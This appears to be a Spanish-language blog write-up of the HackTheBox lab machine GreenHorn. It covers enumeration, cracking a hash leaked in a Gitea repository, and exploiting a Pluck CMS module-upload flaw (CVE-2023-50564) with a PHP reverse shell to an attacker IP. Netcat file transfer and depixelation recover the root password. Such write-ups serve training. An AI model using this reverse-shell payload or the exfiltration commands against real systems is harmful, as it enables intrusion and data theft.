---
layout: single
title: write up GreenHorn HTB
excerpt:
date: 2024-12-11
classes: wide
header:
  teaser: https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/GreenHorn_avatar.png
  teaser_home_page: true
categories:
  - hacking
  - Linux
  - gitea
  - Pluck
  - git
  - crakear
  - RCE
  - pivoting
  - imagen
tags:  
  - hacking
  - Linux
  - gitea
  - Pluck
  - git
  - crakear
  - RCE
  - pivoting
  - imagen
---
"GreenHorn" es una máquina de dificultad fácil en la plataforma HackTheBox. En este reto, descubrimos que el servidor víctima está ejecutando una instancia de Gitea y un servicio web Pluck CMS. Primero, logramos crear una cuenta en la instancia de Gitea y, tras explorar un repositorio público, encontramos un hash que podemos crackear, obteniendo así la contraseña para acceder al panel de administración de Pluck CMS. Al ingresar, instalamos un módulo malicioso que nos permite ejecutar comandos de forma remota, lo que nos da acceso inicial a la máquina víctima. Una vez dentro, descubrimos que uno de los usuarios está utilizando la misma contraseña del panel de Pluck CMS, lo que nos permite pivotear. Este nuevo usuario tiene un archivo PDF que contiene una contraseña pixeleada, la cual podemos "depixelar" para obtener la contraseña del usuario root, logrando así el control total sobre la máquina víctima.

como siempre vamos a empezar con un escaneo de nmap:

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn -sT 
```
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210195726.png)

```bash
nmap -sVC -p22,80,3000 10.10.11.25 -oN ports
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 19:59 CET
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 19:59 (0:00:12 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:00 (0:00:31 remaining)
Nmap scan report for 10.10.11.25
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=7aea91eee7548506; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=1-jFtLBMaF_Ctpl4_j17zk6PfBs6MTczMzg1NzE3NDcyNTk2MzY1Mg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 10 Dec 2024 18:59:34 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=993cd9f587d4c017; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=F0pVp5b-mZxaX7EpI-_H1ESmnXA6MTczMzg1NzE4MDMwMDk2MjUyOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 10 Dec 2024 18:59:40 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=12/10%Time=67588F96%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=7aea91eee7548506;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=1-jFtLBMaF_Ctpl4_j17zk6PfBs6MTczMzg1NzE3NDcyNTk2MzY1Mg;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2010\x20Dec\x202024\x2018:59:34\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\
SF:x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoi
SF:R3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA
SF:6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbm
SF:hvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciL
SF:CJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAv
SF:YX")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Set-Cookie:\x20i_like_gitea=993cd9f587d4c017;\x20Path=/;\x20HttpOnly;\x
SF:20SameSite=Lax\r\nSet-Cookie:\x20_csrf=F0pVp5b-mZxaX7EpI-_H1ESmnXA6MTcz
SF:Mzg1NzE4MDMwMDk2MjUyOQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2010\x20
SF:Dec\x202024\x2018:59:40\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.81 seconds

```
en el puerto 3000 se esta ejecutando un software llamado gitea
vemos que tiene un puerto 80 por lo que vamos a hacer un whatweb para ver que hay por hay

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200304.png)

nos redirige a el dominio greenhorn.htb por lo que lo vamos a añadir a el etc/hosts

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200552.png)

perfect

repetimos el whatweb
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210200712.png)

vemos que nos a generado una cookie y que esta ejecutando la version 4.7.18 de pluck que es basicamente lo mismo que wordpress

vale no veo mucho mas por lo que vamos para dentro

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210201344.png)

pone que la pagina esta en desarrollo y no veo ningun otro directorio o archivo a la vista por lo que voy a enumerar con gobuster

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://greenhorn.htb/ -t 30 -x .php -s "200,301" -b ""
```

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203312.png)

vemos varios archivos interesantes como admin.php o login.php
en admin.php vemos lo siguiente
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203512.png)

pone que no estamos logueados y de seguido nos redirigue a login.php

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210203549.png)

en los demas no hay nada mas interesante por el momento asique voy a saltar a la web del puesrto 3000

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210204554.png)

nos acemos un usuario generico y nos vamos a el directorio de explore

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205038.png)

vemos un repositorio 

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205519.png)

en el vemos lo siguiente
es una estructura igual a la que aviamos sacado con gobuster de la pagina del puerto 80

si nos ponemos a mirar el login.php encontramos algo interesante:

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210205655.png)

```php
//If password is not correct; display error, and store attempt in loginattempt file for brute-force protection.
                elseif (($pass != $ww) && (!isset($login_error))) {
                        $login_error = show_error($lang['login']['incorrect'], 1, true);

                        //If a loginattempt file already exists, update tries variable.
                        if (file_exists(LOGIN_ATTEMPT_FILE))
                                $tries++;
                        else
                                $tries = 1;
```

vemos que esta haciendo para autenticar la sesión, está comparando la contraseña dada por el usuario con la variable $ww

la cosa es que donde esta eso 
por lo que nos toca ir buscando uno a uno

vale en http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php encontramos esto:

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210211833.png)

vemos un hash y como decia en el anterior script es en sha512 por lo que vamos a intentar crakearlo

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512
```

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212025.png)

vemos la contraseña por lo que ya podemos logearnos 

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212119.png)

una vez dentro vemos lo siguiente (muy parecido a la maquina mist la verdad)

si buscamos exploits sobre esta version de pluck encontramos esto

[CVE-2023-50564](https://nvd.nist.gov/vuln/detail/CVE-2023-50564)

En corto, somos capaces de instalar un módulo falso. Este módulo podría ser un archivo .zip con código PHP dentro, el cual es interpretado por el sistema. De manera que comprimimos nuestro archivo PHP previamente creado en un archivo .zip

por lo que vamos a crear la revershell

```php
<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.72/4444 0>&1"'); ?>
```

comprmimos el archivo:

```bash
zip rever.zip rever.php
```

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210212545.png)

y ahora si nos vamos a http://greenhorn.htb/admin.php?action=installmodule y insertamos el .zip

pero antes nos ponemos en escucha con netcat
le damos a subir y pasado un rato

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210213608.png)

estamos dentro

verificamos el /etc/passwd y vemos un usuario juniro 
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210214048.png)

el cual su clave es la misma que habia en el hash por lo que podemos hacer un su junior 

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241210214143.png)
y somos junior

## root

muy bien si vamos al directorio home de junior encontramos lo siguiente

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211151852.png)

vamos a pasarnos el pdf a nuestra maquina atacante para poder verlo

vamos a usar netcat 

```bash
sudo nc -nlvp 1234 > OpenVAS_file.pdf
```
y en la maquina victima
```bash
nc 10.10.16.72 1234 < 'Using OpenVAS.pdf'
```
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211152414.png)

ya lo tenemos por lo que vamos a abrirlo

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153028.png)
vemos que hay una contraseña pero que esta pixelada

podemos usar una herramienta llamada deplix para quitar el pixelado

para ello hacemos una captura a la parte pixelada
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153322.png)

nos bajamos deplix
https://github.com/spipm/Depix

y lo ejecutamos en mi caso de esta forma:

```bash
python3 depix.py -p /home/zzero/GreenHorn/content/Captura\ de\ pantalla\ -2024-12-11\ 15-32-47.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o depixelated_text.png
```
y nos da esto
![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153657.png)

que quiero entender que la contraseña es :
sidefromsidetheothersidesidefromsidetheotherside

![](https://404zzero.github.io/zzero.github.io//assets/images/GreenHorn/Pasted-image-20241211153810.png)
y si que lo es 
por lo que somos root
